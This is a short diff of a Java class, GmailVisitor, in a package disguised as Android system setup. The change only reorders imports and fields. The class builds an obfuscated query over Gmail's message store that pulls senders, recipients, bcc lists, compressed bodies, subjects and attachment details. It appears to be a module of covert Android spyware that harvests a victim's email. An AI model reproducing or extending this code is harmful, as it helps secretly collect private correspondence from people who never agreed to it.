@@ -1,31 +1,30 @@
 package com.android.syssetup.module.email;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.util.Date;
-import java.util.zip.InflaterInputStream;
-
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.RecordVisitor;
 import com.android.syssetup.module.ModuleMessage;
 import com.android.syssetup.module.message.Filter;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.util.Date;
+import java.util.zip.InflaterInputStream;
 
 public class GmailVisitor extends RecordVisitor {
 	private static final String TAG = "GmailVisitor";
+	public String[] projection = StringUtils
+			.split(M.e("_id,fromAddress,toAddresses,ccAddresses,bccAddresses,bodyCompressed,dateSentMs,subject,snippet,bodyEmbedsExternalResources,joinedAttachmentInfos"));
+	public String selection = M.e("_id > ");
+	public int lastId;
 	boolean initialized = false;
 	private ModuleMessage moduleMessage;
 	private String mailstore;
-	public String[] projection = StringUtils
-			.split(M.e("_id,fromAddress,toAddresses,ccAddresses,bccAddresses,bodyCompressed,dateSentMs,subject,snippet,bodyEmbedsExternalResources,joinedAttachmentInfos"));
-
-	public String selection = M.e("_id > ");
-	public int lastId;
 	private String from;
 	private boolean requestStop;
 	private Filter filter;
